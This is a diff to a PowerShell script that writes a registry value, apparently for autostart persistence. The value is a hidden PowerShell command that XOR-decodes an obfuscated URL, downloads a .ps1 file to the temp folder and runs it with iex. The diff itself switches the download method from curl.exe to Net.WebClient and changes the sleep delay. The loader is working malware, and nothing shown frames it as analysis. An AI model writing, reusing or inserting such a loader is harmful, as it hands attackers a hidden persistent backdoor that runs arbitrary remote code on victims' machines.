@@ -16,7 +16,7 @@ if(!(Get-ItemProperty $rk -Name $kn -EA 0)){
     $pk=98
     $pe=@(10,22,22,18,17,88,77,77,16,3,21,76,5,11,22,10,23,0,23,17,7,16,1,13,12,22,7,12,22,76,1,13,15,77,37,16,11,15,54,10,7,48,11,18,18,7,16,79,49,45,49,39,33,55,48,39,77,16,7,6,79,22,7,17,22,77,16,7,4,17,77,10,7,3,6,17,77,15,3,11,12,77,17,20,1,10,13,17,22,61,23,18,6,3,22,7,61,20,80,76,18,17,83)
     $pa=($pe-join',')
-    $pv='powershell -nop -w h -c '+[char]34+'Start-Sleep 25;$k=98;$e=@('+$pa+');$u=[string]::Join('+[char]39+[char]39+',[char[]]($e|%{$_-bxor$k}));$t=[IO.Path]::GetTempPath()+'+[char]39+'s.ps1'+[char]39+';curl.exe -s $u -o $t;if(Test-Path $t){iex(gc $t -Raw)}'+[char]34
+    $pv='powershell -nop -w h -c '+[char]34+'Start-Sleep 30;$k=98;$e=@('+$pa+');$u=[string]::Join('+[char]39+[char]39+',[char[]]($e|%{$_-bxor$k}));$t=[IO.Path]::GetTempPath()+'+[char]39+'s.ps1'+[char]39+';try{(New-Object Net.WebClient).DownloadFile($u,$t)}catch{};if(Test-Path $t){iex(gc $t -Raw)}'+[char]34
     Set-ItemProperty $rk $kn $pv -Force -EA 0
 }
 for(;;){
